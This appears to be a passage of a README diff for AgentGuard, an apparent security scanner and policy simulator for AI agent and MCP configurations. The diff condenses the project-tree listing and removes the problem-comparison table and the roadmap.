-│   │   ├── mcp_scanner.py         # MCP config + secret scanner (18+ patterns)
-│   │   ├── ai_config_scanner.py   # AI framework scanner (eval/exec, Docker, deps, prompts)
-│   │   ├── permission_scanner.py  # Agent permission analyzer + risk scorer
-│   │   └── runner.py              # Scan orchestrator
-│   ├── testing/
-│   │   ├── attack_packs.py        # 17 adversarial scenarios across 5 attack packs
-│   │   └── runner.py              # Adversarial policy simulation engine
-│   ├── controls/
-│   │   ├── registry.py            # 20 OWASP-aligned control definitions
-│   │   └── runner.py              # OWASP coverage report generator
-│   ├── evidence/
-│   │   └── runner.py              # Launch readiness packet generator
-│   ├── baseline/
-│   │   └── runner.py              # Baseline snapshot + drift comparison
-│   ├── monitor/
-│   │   └── runner.py              # Behavioral monitor + drift detector
-│   ├── simulator/
-│   │   └── runner.py              # What-If policy simulator
-│   ├── reports/
-│   │   ├── html_report.py         # HTML report generator
-│   │   └── sarif_report.py        # SARIF output (GitHub Advanced Security)
-│   └── rules/
-│       └── owasp_mcp_top10.yaml   # OWASP MCP Top 10 rule definitions
-├── examples/
-│   ├── demo-agent-project/        # Realistic insecure AI project (for testing)
-│   ├── insecure-agent-config.yaml # Intentionally vulnerable MCP config
-│   ├── secure-agent-config.yaml   # Best-practice example
-│   ├── agent-policy.yaml          # Example policy file
-│   ├── sample-traces.jsonl        # Example agent traces
-│   └── sample-launch-readiness.md # Example evidence packet
-├── docs/
-│   ├── risk-scoring.md            # Risk scoring methodology
-│   └── owasp-control-matrix.md    # OWASP control mapping
-├── tests/                         # 84 tests across all modules
-├── .github/workflows/
-│   ├── ci.yml                     # CI: pytest + ruff on every push
-│   └── publish.yml                # Auto-publish to PyPI on release
-├── pyproject.toml                 # Package configuration
-└── README.md
+│   ├── cli.py                  # 7 CLI commands
+│   ├── models.py               # Finding, RiskScore, ControlResult, etc.
+│   ├── scanners/               # MCP + AI config + permission scanners
+│   ├── testing/                # 17 adversarial attack scenarios
+│   ├── controls/               # 20 OWASP-aligned control definitions
+│   ├── evidence/               # Launch readiness packet generator
+│   ├── baseline/               # Snapshot + drift comparison
+│   ├── monitor/                # Behavioral trace audit
+│   ├── simulator/              # What-If policy simulation
+│   └── reports/                # HTML + SARIF output
+├── examples/                   # Demo project + configs + traces
+├── docs/                       # Risk scoring, OWASP matrix, GitHub Action docs
+├── tests/                      # 84 tests
+├── action.yml                  # GitHub Action
+└── SECURITY.md
 ```
-
----
-
-## Why This Exists
-
-| Problem | Today's Landscape | AgentGuard's Answer |
-|---|---|---|
-| **Content safety** (toxic prompts/responses) | ✅ Solved by Azure Content Safety, NeMo, Guardrails AI | Not our scope — use those tools |
-| **What tools did the agent call?** | ❌ No tool audits this | `aguard monitor` |
-| **Did the agent exceed its permissions?** | ❌ No tool detects drift | `aguard monitor` with policy |
-| **Are my MCP configs secure?** | 🟡 Cisco scanner (basic) | `aguard scan` (deep, OWASP-mapped) |
-| **What if I restrict this permission?** | ❌ Nobody does this | `aguard whatif` (differentiated) |
-| **Are secrets in my agent configs?** | 🟡 Generic secret scanners exist | `aguard scan` (agent-aware context) |
-
----
-
-## Roadmap
-
-- [x] **v0.1** — MCP config scanner + secret detection + OWASP MCP Top 10 rules
-- [x] **v0.2** — Runtime behavioral monitor with OpenTelemetry trace ingestion
-- [x] **v0.3** — Permission drift detection with approval event model
-- [x] **v0.4** — What-If policy simulator with risk scoring and explanations
-- [x] **v0.5** — HTML + SARIF report generators, CI gate flags (`--max-risk`, `--fail-on`)
-- [x] **v0.6** — `aguard evidence` — launch readiness packets with approval checklists
-- [x] **v0.7** — `aguard baseline create` / `aguard baseline compare` — drift detection
-- [x] **v0.8** — `aguard test` — adversarial policy simulation (17 scenarios, 5 attack packs)
-- [x] **v0.9** — `aguard owasp` — OWASP MCP Top 10 control coverage reporting (20 controls)
-- [ ] **v1.0** — Multi-framework adapters (LangChain, CrewAI, AutoGen, Foundry)
-- [ ] **v1.1** — Live agent monitoring (real-time webhook / sidecar mode)
-- [ ] **v1.2** — Custom rule authoring SDK
-
-## Risk Scoring
-
-See [docs/risk-scoring.md](docs/risk-scoring.md) for the full scoring methodology, formula, weights, and CI threshold guidance.
 
 ## Contributing
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions and guidelines.
+See [CONTRIBUTING.md](CONTRIBUTING.md) for setup and guidelines.
 
 ## License
 
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
+Apache License 2.0 — see [LICENSE](LICENSE).
